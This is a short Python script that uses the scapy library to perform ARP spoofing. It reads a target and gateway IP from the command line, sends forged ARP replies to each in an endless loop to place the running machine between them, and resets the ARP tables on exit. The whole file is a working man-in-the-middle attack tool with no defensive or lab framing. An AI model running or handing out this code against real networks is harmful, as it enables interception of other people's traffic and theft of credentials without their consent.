#!/usr/bin/env python

import scapy.all as scapy
import time
import optparse

def getArgs():
    parser = optparse.OptionParser()
    parser.add_option('-t','--target',dest='Target',help='[+] PLEASE SPECIFY THE TARGET IP')
    parser.add_option('-g','--gateway',dest='Gateway',help='[+] PLEASE SPECIFY THE GATEWAY IP')
    options,arguments = parser.parse_args()
    return options

def get_mac(ip):
    arp_req = scapy.ARP(pdst = ip)
    braodcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_broadcast_req = braodcast/arp_req
    answered_list = scapy.srp(arp_broadcast_req, timeout = 3,verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(tar_ip,spoof_ip):
    packet = scapy.ARP(op=2,pdst=tar_ip,psrc=spoof_ip,hwdst=get_mac(tar_ip))
    scapy.send(packet,verbose=False)

def restore(tar_ip,my_ip):
    packet= scapy.ARP(op=2,pdst=tar_ip,psrc=my_ip,hwdst=get_mac(tar_ip),hwsrc=get_mac(my_ip))
    scapy.send(packet,verbose=False,count=4)

Target = getArgs().Target
Gateway = getArgs().Gateway

counter = 0
try:
    while True:
        spoof(Target,Gateway)
        spoof(Gateway,Target)
        counter = counter + 2
        print('\r[+] sent ' + str(counter) + ' packets',end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('  \nRESETTING ARP TABLES......\n')
    restore(Target,Gateway)
    restore(Gateway,Target)
